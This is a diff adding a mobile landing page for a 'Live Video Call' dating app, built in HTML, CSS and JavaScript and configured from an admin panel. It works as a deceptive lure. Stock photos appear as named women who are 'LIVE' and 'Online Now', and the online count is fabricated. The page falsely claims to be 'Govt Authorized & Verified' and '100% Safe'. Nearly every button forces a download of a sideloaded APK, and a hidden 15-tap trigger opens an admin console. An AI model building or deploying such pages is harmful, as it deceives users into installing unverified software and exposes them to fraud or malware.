@@ -1,0 +1,1171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
+  <title>Live Video Call - Official Download</title>
+
+  <!-- Google Fonts & Font Awesome Icons -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+
+  <style>
+    :root {
+      --primary-pink: #ff2a70;
+      --primary-hover: #e01d5d;
+      --accent-soft-pink: #fff1f5;
+      --border-pink: #fecdd3;
+      --text-dark: #0f172a;
+      --text-gray: #64748b;
+      --text-light: #94a3b8;
+      --bg-pill: #f8fafc;
+      --white: #ffffff;
+      --radius-card: 18px;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      background-color: #f1f5f9;
+      font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+      color: var(--text-dark);
+      display: flex;
+      justify-content: center;
+      min-height: 100vh;
+      min-height: 100dvh;
+      overflow-x: hidden;
+    }
+
+    /* Mobile Container Frame */
+    .app-frame {
+      width: 100%;
+      max-width: 440px;
+      background-color: var(--white);
+      min-height: 100vh;
+      min-height: 100dvh;
+      display: flex;
+      flex-direction: column;
+      position: relative;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
+      padding-bottom: 165px; /* Space for persistent floating bar + bottom nav */
+    }
+
+    /* Top Header */
+    .header {
+      padding: 16px 20px 8px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .brand {
+      display: flex;
+      flex-direction: column;
+      cursor: pointer;
+      user-select: none;
+      -webkit-user-select: none;
+    }
+
+    .brand-top-row {
+      display: flex;
+      align-items: center;
+      gap: 9px;
+    }
+
+    .brand-logo-box {
+      width: 32px;
+      height: 32px;
+      border-radius: 8px;
+      overflow: hidden;
+      flex-shrink: 0;
+      background: #ffe4e6;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 2px 6px rgba(255, 42, 112, 0.2);
+    }
+
+    .brand-logo-box img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .brand-title {
+      font-size: 22px;
+      font-weight: 800;
+      letter-spacing: -0.5px;
+      line-height: 1.1;
+      color: #0f172a;
+    }
+
+    .brand-title span {
+      color: var(--primary-pink);
+    }
+
+    .brand-tagline {
+      font-size: 11.5px;
+      font-weight: 500;
+      color: var(--text-gray);
+      margin-top: 2px;
+    }
+
+    .header-actions {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .icon-btn {
+      background: none;
+      border: none;
+      font-size: 20px;
+      color: #1e293b;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: transform 0.15s ease;
+    }
+
+    .icon-btn:active {
+      transform: scale(0.92);
+    }
+
+    /* Category Filter Pills */
+    .filter-scroll {
+      display: flex;
+      gap: 8px;
+      overflow-x: auto;
+      padding: 10px 18px;
+      scrollbar-width: none;
+    }
+
+    .filter-scroll::-webkit-scrollbar {
+      display: none;
+    }
+
+    .category-pill {
+      background: var(--bg-pill);
+      color: #334155;
+      font-size: 12px;
+      font-weight: 600;
+      padding: 6px 15px;
+      border-radius: 20px;
+      border: 1px solid #e2e8f0;
+      white-space: nowrap;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .category-pill.active {
+      background: var(--primary-pink);
+      color: var(--white);
+      border-color: var(--primary-pink);
+    }
+
+    /* Dynamic Hero Banner Section */
+    .hero-banner-section {
+      padding: 4px 18px 12px;
+    }
+
+    .hero-card {
+      position: relative;
+      border-radius: var(--radius-card);
+      overflow: hidden;
+      aspect-ratio: 16 / 8.5;
+      min-height: 165px;
+      background: linear-gradient(135deg, #2d0b28 0%, #150216 100%);
+      background-size: cover;
+      background-position: center;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-end;
+      padding: 16px;
+      box-shadow: 0 8px 25px rgba(255, 42, 112, 0.2);
+      cursor: pointer;
+      border: 1px solid rgba(255, 42, 112, 0.25);
+      transition: transform 0.18s ease;
+    }
+
+    .hero-card:active {
+      transform: scale(0.98);
+    }
+
+    .hero-banner-overlay {
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(180deg, rgba(14, 2, 15, 0.15) 0%, rgba(14, 2, 15, 0.88) 100%);
+      z-index: 1;
+    }
+
+    .hero-banner-content {
+      position: relative;
+      z-index: 2;
+      color: #ffffff;
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+    }
+
+    .hero-live-pill {
+      align-self: flex-start;
+      background: rgba(255, 42, 112, 0.92);
+      color: #fff;
+      font-size: 9.5px;
+      font-weight: 800;
+      padding: 3px 9px;
+      border-radius: 20px;
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      backdrop-filter: blur(4px);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 2px;
+    }
+
+    .hero-pulse-dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: #22c55e;
+      animation: pulse-dot 1.2s infinite ease-in-out;
+    }
+
+    .hero-title {
+      font-size: 17px;
+      font-weight: 800;
+      color: #fff;
+      line-height: 1.15;
+      letter-spacing: -0.3px;
+      text-shadow: 0 2px 5px rgba(0, 0, 0, 0.7);
+      text-transform: uppercase;
+    }
+
+    .hero-subtitle {
+      font-size: 11px;
+      color: #fecdd3;
+      font-weight: 600;
+      line-height: 1.35;
+      text-shadow: 0 1px 3px rgba(0, 0, 0, 0.7);
+    }
+
+    .hero-cta-btn {
+      align-self: flex-start;
+      margin-top: 5px;
+      background: linear-gradient(135deg, #ff2a70 0%, #d91054 100%);
+      color: #fff;
+      font-size: 11px;
+      font-weight: 800;
+      padding: 5px 13px;
+      border-radius: 20px;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      box-shadow: 0 4px 12px rgba(255, 42, 112, 0.45);
+    }
+
+    /* Section Title Bar */
+    .section-label-bar {
+      padding: 4px 20px 8px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .section-label-title {
+      font-size: 13px;
+      font-weight: 800;
+      color: #1e293b;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      letter-spacing: 0.2px;
+    }
+
+    .section-label-count {
+      font-size: 11px;
+      font-weight: 700;
+      color: #22c55e;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    /* 2x2 Video Profile Grid */
+    .content-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 12px;
+      padding: 4px 18px 16px;
+    }
+
+    .media-card {
+      position: relative;
+      border-radius: var(--radius-card);
+      overflow: hidden;
+      aspect-ratio: 3 / 4.4;
+      background: #150516;
+      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.08);
+      cursor: pointer;
+    }
+
+    .media-card img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+      transition: transform 0.3s ease;
+    }
+
+    .media-card:active img {
+      transform: scale(1.03);
+    }
+
+    /* Live Badge Overlay */
+    .live-badge {
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      background: rgba(255, 42, 112, 0.9);
+      color: #fff;
+      font-size: 9.5px;
+      font-weight: 800;
+      padding: 3px 8px;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      backdrop-filter: blur(4px);
+      z-index: 2;
+    }
+
+    .live-badge::before {
+      content: '';
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: #fff;
+      animation: pulse-dot 1.2s infinite ease-in-out;
+    }
+
+    @keyframes pulse-dot {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.4; transform: scale(0.8); }
+    }
+
+    .card-overlay {
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(180deg, rgba(0,0,0,0) 45%, rgba(0,0,0,0.85) 100%);
+      display: flex;
+      align-items: flex-end;
+      padding: 12px;
+      color: var(--white);
+      z-index: 2;
+    }
+
+    .card-info {
+      flex: 1;
+      padding-right: 6px;
+    }
+
+    .card-title {
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 1.2;
+      margin-bottom: 2px;
+      text-shadow: 0 1px 3px rgba(0,0,0,0.6);
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .card-subtext {
+      font-size: 10px;
+      color: #fecdd3;
+      font-weight: 600;
+      margin-bottom: 3px;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .card-meta {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 10px;
+      font-weight: 600;
+      color: #f8fafc;
+    }
+
+    .card-video-btn {
+      width: 36px;
+      height: 36px;
+      background: var(--primary-pink);
+      color: var(--white);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
+      flex-shrink: 0;
+      box-shadow: 0 3px 10px rgba(255, 42, 112, 0.4);
+      transition: transform 0.15s ease;
+    }
+
+    .card-video-btn:active {
+      transform: scale(0.9);
+    }
+
+    /* ALWAYS FLOATING DOWNLOAD BAR (Docked above bottom navigation) */
+    .floating-download-card {
+      position: fixed;
+      bottom: 74px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: calc(100% - 24px);
+      max-width: 416px;
+      background: rgba(255, 255, 255, 0.96);
+      backdrop-filter: blur(14px);
+      -webkit-backdrop-filter: blur(14px);
+      border: 1.5px solid var(--border-pink);
+      border-radius: 18px;
+      padding: 10px 14px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+      z-index: 70;
+      box-shadow: 0 10px 30px rgba(255, 42, 112, 0.22), 0 4px 12px rgba(0, 0, 0, 0.08);
+      animation: float-pulse 3.5s infinite ease-in-out;
+    }
+
+    @keyframes float-pulse {
+      0%, 100% { transform: translateX(-50%) translateY(0); }
+      50% { transform: translateX(-50%) translateY(-3px); }
+    }
+
+    .strip-left {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      flex: 1;
+      overflow: hidden;
+    }
+
+    .strip-icon-box {
+      width: 40px;
+      height: 40px;
+      background: #ffe4e6;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--primary-pink);
+      font-size: 19px;
+      flex-shrink: 0;
+      overflow: hidden;
+    }
+
+    .strip-icon-box img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .strip-details {
+      overflow: hidden;
+    }
+
+    .strip-details h4 {
+      font-size: 13px;
+      font-weight: 800;
+      color: var(--text-dark);
+      margin-bottom: 2px;
+      line-height: 1.2;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .strip-details p {
+      font-size: 10px;
+      color: var(--text-gray);
+      font-weight: 600;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .strip-btn-wrap {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 3px;
+      flex-shrink: 0;
+    }
+
+    .btn-download-pill {
+      background: linear-gradient(135deg, #ff2a70 0%, #d91054 100%);
+      color: var(--white);
+      border: none;
+      padding: 9px 16px;
+      border-radius: 25px;
+      font-size: 12px;
+      font-weight: 800;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      cursor: pointer;
+      text-decoration: none;
+      box-shadow: 0 4px 14px rgba(255, 42, 112, 0.35);
+      transition: transform 0.15s ease;
+    }
+
+    .btn-download-pill:active {
+      transform: scale(0.96);
+    }
+
+    .btn-sub-meta {
+      font-size: 9px;
+      color: var(--text-gray);
+      font-weight: 600;
+    }
+
+    /* Fixed Bottom Navigation Bar */
+    .bottom-nav {
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      max-width: 440px;
+      height: 64px;
+      background: var(--white);
+      border-top: 1px solid #f1f5f9;
+      display: flex;
+      align-items: center;
+      justify-content: space-around;
+      z-index: 80;
+      box-shadow: 0 -4px 15px rgba(0,0,0,0.03);
+    }
+
+    .nav-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 4px;
+      text-decoration: none;
+      color: var(--text-gray);
+      background: none;
+      border: none;
+      cursor: pointer;
+      font-size: 10.5px;
+      font-weight: 600;
+      padding: 6px 12px;
+    }
+
+    .nav-item i {
+      font-size: 19px;
+    }
+
+    .nav-item.active {
+      color: var(--primary-pink);
+    }
+
+    /* DOWNLOAD POPUP MODAL */
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(15, 23, 42, 0.7);
+      backdrop-filter: blur(6px);
+      -webkit-backdrop-filter: blur(6px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      z-index: 100;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.25s ease;
+    }
+
+    .modal-overlay.open {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    .modal-box {
+      background: var(--white);
+      width: 100%;
+      max-width: 330px;
+      border-radius: 24px;
+      padding: 26px 20px 20px;
+      text-align: center;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.25);
+      transform: scale(0.92);
+      transition: transform 0.25s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+
+    .modal-overlay.open .modal-box {
+      transform: scale(1);
+    }
+
+    .modal-icon-badge {
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      background: #ffe4e6;
+      color: var(--primary-pink);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 26px;
+      margin: 0 auto 16px;
+      box-shadow: 0 0 16px rgba(255, 42, 112, 0.2);
+      overflow: hidden;
+    }
+
+    .modal-icon-badge img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .modal-box h3 {
+      font-size: 18px;
+      font-weight: 800;
+      color: var(--text-dark);
+      margin-bottom: 8px;
+    }
+
+    .modal-box p {
+      font-size: 12.5px;
+      color: var(--text-gray);
+      line-height: 1.45;
+      margin-bottom: 18px;
+    }
+
+    .modal-btn-download {
+      display: block;
+      width: 100%;
+      background: linear-gradient(135deg, #ff2a70 0%, #d91054 100%);
+      color: var(--white);
+      padding: 13px 0;
+      border-radius: 30px;
+      font-size: 14px;
+      font-weight: 700;
+      text-decoration: none;
+      border: none;
+      cursor: pointer;
+      box-shadow: 0 4px 14px rgba(255, 42, 112, 0.35);
+      margin-bottom: 8px;
+    }
+
+    .modal-btn-download:active {
+      transform: scale(0.98);
+    }
+
+    .modal-apk-meta {
+      font-size: 11px;
+      color: var(--text-light);
+      margin-bottom: 12px;
+      font-weight: 600;
+    }
+
+    .modal-close-btn {
+      background: transparent;
+      border: none;
+      color: var(--text-light);
+      font-size: 12.5px;
+      font-weight: 600;
+      cursor: pointer;
+      padding: 4px 12px;
+    }
+
+    /* Floating Toast */
+    #front-toast {
+      position: fixed;
+      top: max(16px, env(safe-area-inset-top, 16px));
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(15, 23, 42, 0.96);
+      border: 1px solid var(--primary-pink);
+      color: #fff;
+      padding: 10px 18px;
+      border-radius: 30px;
+      font-size: 12px;
+      font-weight: 700;
+      z-index: 9999;
+      display: none;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4), 0 0 15px rgba(255, 42, 112, 0.3);
+      align-items: center;
+      gap: 8px;
+      max-width: 90%;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Floating Toast Notification -->
+  <div id="front-toast">
+    <i class="fa-solid fa-bolt" style="color: #ff2a70;"></i>
+    <span id="toast-text">Notification</span>
+  </div>
+
+  <div class="app-frame">
+    
+    <!-- Top Header with Brand & Secret 15-Tap Trigger -->
+    <header class="header">
+      <div class="brand" id="brand-secret-trigger" title="Live Video Call">
+        <div class="brand-top-row">
+          <div class="brand-logo-box" id="brand-logo-slot" style="display: none;">
+            <img id="brand-logo-img" src="" alt="App Logo" />
+          </div>
+          <h1 class="brand-title" id="brand-title-text">Video<span>Call</span></h1>
+        </div>
+        <p class="brand-tagline" id="brand-tagline-text">1-on-1 Live Video &amp; Instant Matches</p>
+      </div>
+
+      <div class="header-actions">
+        <button class="icon-btn trigger-popup" aria-label="Search">
+          <i class="fa-solid fa-magnifying-glass"></i>
+        </button>
+        <button class="icon-btn trigger-popup" aria-label="Notifications">
+          <i class="fa-regular fa-bell"></i>
+        </button>
+      </div>
+    </header>
+
+    <!-- Category Filter Pills -->
+    <nav class="filter-scroll">
+      <button class="category-pill active">All Live</button>
+      <button class="category-pill trigger-popup">Nearby</button>
+      <button class="category-pill trigger-popup">Instant Call</button>
+      <button class="category-pill trigger-popup">Verified</button>
+      <button class="category-pill trigger-popup">New Friends</button>
+      <button class="category-pill trigger-popup">Popular</button>
+    </nav>
+
+    <!-- Dynamic Hero Banner Section (Managed in Admin Panel) -->
+    <section class="hero-banner-section" id="hero-banner-container">
+      <div class="hero-card trigger-popup" id="hero-card-element">
+        <div class="hero-banner-overlay"></div>
+        <div class="hero-banner-content">
+          <div class="hero-live-pill">
+            <span class="hero-pulse-dot"></span>
+            <span id="hero-badge-text">Govt Authorized &amp; Verified</span>
+          </div>
+          <h2 class="hero-title" id="hero-title-text">START LIVE VIDEO</h2>
+          <p class="hero-subtitle" id="hero-tagline-text">REAL FACES. LIVE VIDEO. ZERO CATFISHING.</p>
+          <div class="hero-cta-btn">
+            <i class="fa-solid fa-video"></i> Start Live Video Now
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Section Title Bar -->
+    <div class="section-label-bar">
+      <span class="section-label-title"><i class="fa-solid fa-circle-dot" style="color: #22c55e; font-size: 9px;"></i> Online Video Matches</span>
+      <span class="section-label-count" id="live-matches-count">12,500+ Online</span>
+    </div>
+
+    <!-- 2x2 Video Profiles Grid (Dynamically Populated from Admin Screenshots) -->
+    <main class="content-grid" id="profiles-content-grid">
+      
+      <!-- Default Profile 1 -->
+      <div class="media-card trigger-popup">
+        <div class="live-badge">LIVE</div>
+        <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=600&q=80" alt="Zoya" />
+        <div class="card-overlay">
+          <div class="card-info">
+            <h2 class="card-title">Zoya Khan</h2>
+            <div class="card-subtext"><i class="fa-solid fa-circle" style="font-size: 7px; color: #22c55e;"></i> Online Now</div>
+            <div class="card-meta"><i class="fa-solid fa-video"></i> Free Call</div>
+          </div>
+          <div class="card-video-btn"><i class="fa-solid fa-video"></i></div>
+        </div>
+      </div>
+
+      <!-- Default Profile 2 -->
+      <div class="media-card trigger-popup">
+        <div class="live-badge">LIVE</div>
+        <img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?auto=format&fit=crop&w=600&q=80" alt="Kanika" />
+        <div class="card-overlay">
+          <div class="card-info">
+            <h2 class="card-title">Kanika Singh</h2>
+            <div class="card-subtext"><i class="fa-solid fa-circle" style="font-size: 7px; color: #22c55e;"></i> Online Now</div>
+            <div class="card-meta"><i class="fa-solid fa-video"></i> Free Call</div>
+          </div>
+          <div class="card-video-btn"><i class="fa-solid fa-video"></i></div>
+        </div>
+      </div>
+
+      <!-- Default Profile 3 -->
+      <div class="media-card trigger-popup">
+        <div class="live-badge">LIVE</div>
+        <img src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?auto=format&fit=crop&w=600&q=80" alt="Pooja" />
+        <div class="card-overlay">
+          <div class="card-info">
+            <h2 class="card-title">Pooja</h2>
+            <div class="card-subtext"><i class="fa-solid fa-circle" style="font-size: 7px; color: #22c55e;"></i> Online Now</div>
+            <div class="card-meta"><i class="fa-solid fa-video"></i> Free Call</div>
+          </div>
+          <div class="card-video-btn"><i class="fa-solid fa-video"></i></div>
+        </div>
+      </div>
+
+      <!-- Default Profile 4 -->
+      <div class="media-card trigger-popup">
+        <div class="live-badge">LIVE</div>
+        <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=600&q=80" alt="Maya" />
+        <div class="card-overlay">
+          <div class="card-info">
+            <h2 class="card-title">Maya</h2>
+            <div class="card-subtext"><i class="fa-solid fa-circle" style="font-size: 7px; color: #22c55e;"></i> Online Now</div>
+            <div class="card-meta"><i class="fa-solid fa-video"></i> Free Call</div>
+          </div>
+          <div class="card-video-btn"><i class="fa-solid fa-video"></i></div>
+        </div>
+      </div>
+
+    </main>
+
+    <!-- ALWAYS FLOATING DOWNLOAD BAR (Stays docked above bottom nav) -->
+    <div class="floating-download-card">
+      <div class="strip-left">
+        <div class="strip-icon-box" id="strip-icon-box">
+          <i class="fa-solid fa-video" id="strip-icon-fallback"></i>
+          <img id="strip-logo-img" src="" alt="App" style="display: none;" />
+        </div>
+        <div class="strip-details">
+          <h4 id="strip-app-title">Start Live Video Call</h4>
+          <p id="strip-app-subtitle">Unlimited calls • 100% Free • Android</p>
+        </div>
+      </div>
+      <div class="strip-btn-wrap">
+        <a href="/api/download/apk" class="btn-download-pill download-action-btn" id="btn-floating-download" download>
+          <i class="fa-solid fa-download"></i> Connect
+        </a>
+        <span class="btn-sub-meta" id="btn-floating-meta">v1.0 • Free APK</span>
+      </div>
+    </div>
+
+    <!-- Fixed Bottom Navigation Bar -->
+    <nav class="bottom-nav">
+      <button class="nav-item active">
+        <i class="fa-solid fa-video"></i>
+        <span>Live</span>
+      </button>
+      <button class="nav-item trigger-popup">
+        <i class="fa-solid fa-fire"></i>
+        <span>Matches</span>
+      </button>
+      <button class="nav-item trigger-popup">
+        <i class="fa-regular fa-comment-dots"></i>
+        <span>Chats</span>
+      </button>
+      <button class="nav-item trigger-popup">
+        <i class="fa-regular fa-user"></i>
+        <span>Profile</span>
+      </button>
+    </nav>
+
+  </div>
+
+  <!-- POPUP MODAL: "DOWNLOAD APP FIRST" -->
+  <div class="modal-overlay" id="downloadModal">
+    <div class="modal-box">
+      <div class="modal-icon-badge" id="modal-icon-badge">
+        <i class="fa-solid fa-video" id="modal-icon-fallback"></i>
+        <img id="modal-logo-img" src="" alt="App" style="display: none;" />
+      </div>
+      <h3 id="modal-title-text">Download App Required</h3>
+      <p id="modal-desc-text">Please download and install the official app first to start free live 1-on-1 video calls with online users.</p>
+      
+      <a href="/api/download/apk" class="modal-btn-download download-action-btn" id="btn-modal-download" download>
+        <i class="fa-solid fa-download"></i> Download App (Free)
+      </a>
+      <div class="modal-apk-meta" id="modal-apk-meta-text">
+        Official Android APK • Version 1.0 • 100% Free
+      </div>
+      <button class="modal-close-btn" id="closeModalBtn">Cancel</button>
+    </div>
+  </div>
+
+  <script>
+    // ==========================================
+    // Core Elements & State
+    // ==========================================
+    const modal = document.getElementById('downloadModal');
+    const closeBtn = document.getElementById('closeModalBtn');
+    let currentAppConfig = null;
+
+    // Toast Notification helper
+    function showToast(msg) {
+      const toast = document.getElementById('front-toast');
+      const text = document.getElementById('toast-text');
+      if (!toast || !text) return;
+      text.textContent = msg;
+      toast.style.display = 'inline-flex';
+      setTimeout(() => {
+        toast.style.display = 'none';
+      }, 3500);
+    }
+
+    // Modal Controls
+    function openModal() {
+      if (modal) modal.classList.add('open');
+    }
+
+    function closeModal() {
+      if (modal) modal.classList.remove('open');
+    }
+
+    if (closeBtn) closeBtn.addEventListener('click', closeModal);
+
+    if (modal) {
+      modal.addEventListener('click', (e) => {
+        if (e.target === modal) closeModal();
+      });
+    }
+
+    // Bind triggers to open popup modal
+    function bindPopupTriggers() {
+      const triggers = document.querySelectorAll('.trigger-popup');
+      triggers.forEach(element => {
+        element.removeEventListener('click', handlePopupClick);
+        element.addEventListener('click', handlePopupClick);
+      });
+
+      const downloadBtns = document.querySelectorAll('.download-action-btn');
+      downloadBtns.forEach(btn => {
+        btn.removeEventListener('click', handleDownloadClick);
+        btn.addEventListener('click', handleDownloadClick);
+      });
+    }
+
+    function handlePopupClick(e) {
+      e.preventDefault();
+      openModal();
+    }
+
+    function handleDownloadClick() {
+      closeModal();
+      const appName = currentAppConfig?.appName || 'App';
+      showToast('📥 Starting download for ' + appName + ' APK...');
+      if (navigator.vibrate) navigator.vibrate(30);
+    }
+
+    // Category pills tab switcher
+    const categoryPills = document.querySelectorAll('.category-pill');
+    categoryPills.forEach(pill => {
+      pill.addEventListener('click', () => {
+        categoryPills.forEach(p => p.classList.remove('active'));
+        pill.classList.add('active');
+        if (navigator.vibrate) navigator.vibrate(15);
+      });
+    });
+
+    // ==========================================
+    // Secret 15-Tap Shortcut to Open Admin Panel
+    // ==========================================
+    let brandTapCount = 0;
+    let brandTapTimer = null;
+    const brandTrigger = document.getElementById('brand-secret-trigger');
+
+    if (brandTrigger) {
+      brandTrigger.addEventListener('click', () => {
+        brandTapCount++;
+        clearTimeout(brandTapTimer);
+        brandTapTimer = setTimeout(() => {
+          brandTapCount = 0;
+        }, 3200);
+
+        if (navigator.vibrate) navigator.vibrate(25);
+
+        if (brandTapCount >= 15) {
+          clearTimeout(brandTapTimer);
+          brandTapCount = 0;
+          if (navigator.vibrate) navigator.vibrate([60, 40, 60]);
+          showToast('⚡ Opening Admin Console...');
+          setTimeout(() => {
+            window.location.href = '/admin';
+          }, 500);
+        }
+      });
+    }
+
+    // ==========================================
+    // Dynamic Admin Panel Integration (/api/config)
+    // ==========================================
+    async function initDynamicConfig() {
+      try {
+        const res = await fetch('/api/config');
+        if (!res.ok) return;
+        const cfg = await res.json();
+        currentAppConfig = cfg;
+        applyConfig(cfg);
+      } catch (err) {
+        console.warn('Could not load dynamic admin config:', err);
+      }
+    }
+
+    function applyConfig(cfg) {
+      if (!cfg) return;
+
+      const appName = cfg.appName || 'VideoCall';
+      const appTitle = cfg.appTitle || (appName + ' Dating');
+      const tagline = cfg.tagline || '1-on-1 Live Video & Instant Matches';
+      const authBadge = cfg.subTagline || cfg.verificationBadge || 'Govt Authorized & Verified';
+
+      // 1. Page Title & Brand Header
+      document.title = appName + ' - Official Download';
+      
+      const brandTitleEl = document.getElementById('brand-title-text');
+      if (brandTitleEl) {
+        brandTitleEl.innerHTML = appName + '<span>Live</span>';
+      }
+
+      const brandTaglineEl = document.getElementById('brand-tagline-text');
+      if (brandTaglineEl) {
+        brandTaglineEl.textContent = tagline;
+      }
+
+      // 2. Custom Logo (Header, Floating Bar, Modal)
+      if (cfg.logoUrl) {
+        const logoSlot = document.getElementById('brand-logo-slot');
+        const logoImg = document.getElementById('brand-logo-img');
+        if (logoSlot && logoImg) {
+          logoImg.src = cfg.logoUrl;
+          logoSlot.style.display = 'flex';
+        }
+
+        const stripImg = document.getElementById('strip-logo-img');
+        const stripIconFallback = document.getElementById('strip-icon-fallback');
+        if (stripImg && stripIconFallback) {
+          stripImg.src = cfg.logoUrl;
+          stripImg.style.display = 'block';
+          stripIconFallback.style.display = 'none';
+        }
+
+        const modalImg = document.getElementById('modal-logo-img');
+        const modalIconFallback = document.getElementById('modal-icon-fallback');
+        if (modalImg && modalIconFallback) {
+          modalImg.src = cfg.logoUrl;
+          modalImg.style.display = 'block';
+          modalIconFallback.style.display = 'none';
+        }
+      }
+
+      // 3. Dynamic Hero Banner
+      const heroCard = document.getElementById('hero-card-element');
+      const heroTitle = document.getElementById('hero-title-text');
+      const heroTagline = document.getElementById('hero-tagline-text');
+      const heroBadge = document.getElementById('hero-badge-text');
+
+      if (heroCard && cfg.heroBannerUrl) {
+        heroCard.style.backgroundImage = 'url("' + cfg.heroBannerUrl + '")';
+      }
+      if (heroTitle) heroTitle.textContent = (cfg.appName || 'FRIENLY').toUpperCase() + ' LIVE';
+      if (heroTagline) heroTagline.textContent = tagline;
+      if (heroBadge) heroBadge.textContent = authBadge;
+
+      // 4. Live Matches Stats Count
+      const matchesEl = document.getElementById('live-matches-count');
+      if (matchesEl && cfg.matchesCount) {
+        matchesEl.textContent = cfg.matchesCount + ' Online';
+      }
+
+      // 5. Dynamic 2x2 Video Profiles Grid (Screenshots Carousel Sync)
+      if (Array.isArray(cfg.screenshots) && cfg.screenshots.length > 0) {
+        renderProfilesGrid(cfg.screenshots);
+      }
+
+      // 6. Floating Bar & Modal Texts
+      const stripTitle = document.getElementById('strip-app-title');
+      if (stripTitle) stripTitle.textContent = 'Start ' + appName + ' Video Call';
+
+      const stripSubtitle = document.getElementById('strip-app-subtitle');
+      if (stripSubtitle) {
+        const pricing = cfg.pricing || '100% Free';
+        stripSubtitle.textContent = 'Unlimited calls • ' + pricing + ' • Android';
+      }
+
+      const modalTitle = document.getElementById('modal-title-text');
+      if (modalTitle) modalTitle.textContent = 'Download ' + appName + ' App';
+
+      const modalDesc = document.getElementById('modal-desc-text');
+      if (modalDesc) {
+        modalDesc.textContent = 'Please download and install the official ' + appName + ' app first to start free live 1-on-1 video calls with online users.';
+      }
+
+      // 7. APK Version & Meta
+      const apkVersion = cfg.apk?.version || cfg.version || '1.0';
+      const apkSize = cfg.apk?.fileSize ? (' • ' + cfg.apk.fileSize) : '';
+
+      const floatingMeta = document.getElementById('btn-floating-meta');
+      if (floatingMeta) floatingMeta.textContent = 'v' + apkVersion + apkSize;
+
+      const modalMeta = document.getElementById('modal-apk-meta-text');
+      if (modalMeta) modalMeta.textContent = 'Official Android APK • Version ' + apkVersion + apkSize + ' • 100% Safe';
+
+      // 8. Wire direct APK download links
+      const floatingBtn = document.getElementById('btn-floating-download');
+      const modalBtn = document.getElementById('btn-modal-download');
+
+      if (floatingBtn) floatingBtn.href = '/api/download/apk';
+      if (modalBtn) modalBtn.href = '/api/download/apk';
+    }
+
